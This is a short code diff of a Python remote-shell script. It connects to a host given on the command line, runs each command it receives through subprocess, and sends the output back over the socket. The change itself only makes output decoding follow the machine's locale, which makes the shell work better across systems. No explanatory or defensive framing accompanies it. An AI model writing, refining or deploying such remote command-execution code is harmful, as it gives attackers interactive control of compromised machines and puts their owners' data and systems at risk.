@@ -1,5 +1,8 @@
 import socket, subprocess as sp,sys
-import os
+import os, locale
+
+#setting local encoding pref
+locenc = locale.getpreferredencoding()
 
 try :
     host = sys.argv[1]
@@ -27,7 +30,7 @@ while True:
                           stderr=sp.PIPE,
                           stdin=sp.PIPE)
             out, err = sh.communicate()
-            result = out.decode("iso-8859-1") + err.decode("iso-8859-1")
+            result = out.decode(locenc) + err.decode(locenc)
             conn.sendall(bytes(result,encoding='utf-8'))
     else :
         break
